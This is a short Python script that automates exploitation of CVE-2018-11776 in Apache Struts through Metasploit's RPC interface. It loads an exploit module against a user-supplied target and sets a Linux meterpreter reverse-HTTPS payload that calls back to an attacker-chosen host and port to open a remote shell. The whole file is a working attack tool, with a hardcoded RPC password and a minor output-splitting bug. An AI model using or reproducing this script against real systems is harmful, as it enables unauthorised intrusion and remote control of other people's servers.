# Exploit source http://www.primalsecurity.net/python-for-metasploit-automation/
import os, optparse, sys, subprocess
from metasploit.msfrpc import MsfRpcClient

# metasploit_login = os.environ['metasploit_login_id']
metasploit_login = "passwd"
def sploiter(RHOST, LHOST, LPORT, session):
    client = MsfRpcClient('passwd', server="127.0.0.1", ssl=False)
    ress = client.call('console.create')
    console_id = ress['id']

    ## Exploit CVE-2018-11776
    commands = """use exploit/multi/http/struts2_rest_xstream
    set PAYLOAD linux/x64/meterpreter_reverse_https
    set RHOST """+RHOST+"""
    set LHOST """+LHOST+"""
    set LPORT """+LPORT+"""
    set ExitOnSession false
    exploit -z
    """
    print ("[+] Exploiting CVE-2018-11776 on: " + RHOST)
    client.call('console.write',[console_id,commands])
    res = client.call('console.read',[console_id])
    result = res['data'].split('n')

def main():
    parser = optparse.OptionParser(sys.argv[0] + ' -p LPORT -r RHOST -l LHOST')
    parser.add_option('-p', dest='LPORT', type='string', 
    help ='specify a port to listen on')
    parser.add_option('-r', dest='RHOST', type='string', 
    help='Specify a remote host')
    parser.add_option('-l', dest='LHOST', type='string', 
    help='Specify a local host')
    parser.add_option('-s', dest='session', type='string', 
    help ='specify session ID')
    (options, args) = parser.parse_args()
    session=options.session
    RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT

    if (RHOST == None) and (LPORT == None) and (LHOST == None):
        print (parser.usage)
        sys.exit(0)

    sploiter(RHOST, LHOST, LPORT, session)
 
if __name__ == '__main__':
    main()
